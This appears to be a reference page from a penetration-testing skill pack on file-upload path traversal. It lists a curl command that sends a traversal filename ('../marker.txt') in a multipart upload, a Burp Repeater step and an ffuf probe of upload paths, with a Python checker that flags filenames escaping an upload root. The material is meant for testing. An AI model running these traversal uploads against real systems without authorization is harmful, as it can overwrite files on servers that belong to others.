# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`file-upload-and-webshell-filename-and-path-abuse`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -F 'file=@marker.txt;filename=../marker.txt' https://target.example/upload` | Submit a traversal filename while keeping content benign | Cross-platform |
| `Burp Suite Repeater` | `Edit the multipart filename field to traversal and collision candidates` | Test path construction without changing the body | Cross-platform |
| `ffuf` | `ffuf -u https://target.example/uploads/FUZZ -w candidates.txt -mc 200` | Probe predictable storage paths for the stored file | Linux, macOS, Windows |

## Minimal Script Shape

A destination-path checker: given candidate filenames, it resolves each under the upload root and reports which escape it, flagging missing canonicalisation before any upload.

```python
import os, sys

UPLOAD_ROOT = os.path.realpath("/srv/uploads")

def resolves_inside(filename):
    dest = os.path.realpath(os.path.join(UPLOAD_ROOT, filename))
    try:
        inside = os.path.commonpath([dest, UPLOAD_ROOT]) == UPLOAD_ROOT
    except ValueError:
        inside = False
    return dest, inside

for name in sys.argv[1:]:
    dest, inside = resolves_inside(name)
    print({"submitted": name, "resolved": dest, "stays_in_root": inside,
           "canonicalisation_gap": not inside})
```
